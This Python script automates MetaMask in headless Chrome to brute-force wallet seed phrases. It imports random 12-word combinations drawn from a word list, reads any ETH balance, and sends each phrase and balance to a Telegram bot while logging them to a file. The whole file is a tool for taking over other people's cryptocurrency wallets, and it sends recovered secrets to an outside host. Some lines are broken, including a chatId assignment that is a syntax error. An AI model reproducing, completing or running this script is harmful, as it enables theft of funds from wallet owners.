import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import random
import requests
Token = "Your Token"
chatId = #Your chatID#
with open('english.txt', 'r') as file:
    all_words = file.read().splitlines()

RESULT_FILE = 'mnemonic_combinations.txt'
PASSWORD = '11111111'

def enter_mnemonic(driver, mnemonic):
    for word in mnemonic.split():
        driver.switch_to.active_element.send_keys(word)
        for i in range(2):
            driver.find_element(By.CSS_SELECTOR, 'body').send_keys(Keys.TAB)
    #time.sleep(0.5)
def import_wallet(driver, mnemonic, password):
    try:
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/ul/li[1]/div/input').click() # agree to TOS
        #time.sleep(0.5)
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/ul/li[3]/button').click() # import
        #time.sleep(0.5)
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/div/button[2]').click() # no thanks
        #time.sleep(0.5)
        for i in range(3): driver.find_element(By.CSS_SELECTOR, 'body').send_keys(Keys.TAB) # locate mnemonic box
        for word in mnemonic.split():  # Corrected the loop to iterate over mnemonic instead of RESULT_FILE
            driver.switch_to.active_element.send_keys(word) # input each mnemonic to current textbox
            for i in range(2): driver.find_element(By.CSS_SELECTOR, 'body').send_keys(Keys.TAB) # switch to next textbox
            # time.sleep(0.5)
        #time.sleep(0.5)
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/div[4]/div/button').click() # confirm
        #time.sleep(0.5)
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[1]/label/input').send_keys(PASSWORD) # enter password
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[2]/label/input').send_keys(PASSWORD) # enter password twice
        #time.sleep(0.5)
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/div[2]/form/div[3]/label/input').click() # I understand
        driver.find_element('xpath', '//*[@id="app-content"]/div/div[2]/div/div/div/div[2]/form/button').click() # import my wallet
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/div[2]/button').click() # got it
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/div[2]/button').click() # next page
        driver.find_element('xpath', '/html/body/div[1]/div/div[2]/div/div/div/div[2]/button').click() # done

        driver.find_element('xpath', '/html/body/div[2]/div/div/section/div[1]/div/button/span').click() # close
        return True
    except:
        print('Error importing wallet')
        return False

def get_balance(driver):
    try:
        balance_element = driver.find_element(By.XPATH, '/html/body/div[1]/div/div[3]/div/div/div/div[1]/div/div[1]/div[2]/div/div/div/div/span[2]')
        balance_text = balance_element.text.strip()
        balance = balance_text.replace("ETH", "").replace(",", "").strip()
        print("Current Balance:", balance)
        return balance
    except Exception as e:
        print("Error getting balance:", e)
        return None


#--------------------------------------------------selenium config
chrome_options = Options()
chrome_options.add_extension('MetaMask_Chrome.crx')
chrome_options.add_argument("--headless=new")


while True:
    driver = webdriver.Chrome(options=chrome_options)
    driver.implicitly_wait(10)
    time.sleep(1)
    driver.switch_to.window(driver.window_handles[1])


    # Выбираем случайные 12 слов из списка
    random_words = random.sample(all_words, 12)
    MNEMONIC = ' '.join(random_words)

    if import_wallet(driver, MNEMONIC, PASSWORD):
        print('Successfully entered wallet')

        balance = get_balance(driver)
        if balance is not None:
            message = f'{MNEMONIC}: {balance}\n'
            url = f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={chatId}&text={message}"
            print(requests.get(url).json())
            with open(RESULT_FILE, 'a') as result_file:  # Дозаписываем в файл
                result_file.write(f'Metamask: {MNEMONIC}: {balance}\n')  # Записываем мнемоническую фразу и баланс в одну строку
            print(f'Balance for mnemonic "{MNEMONIC}" saved to file')
    else:
        driver.quit()
        print('Retrying...')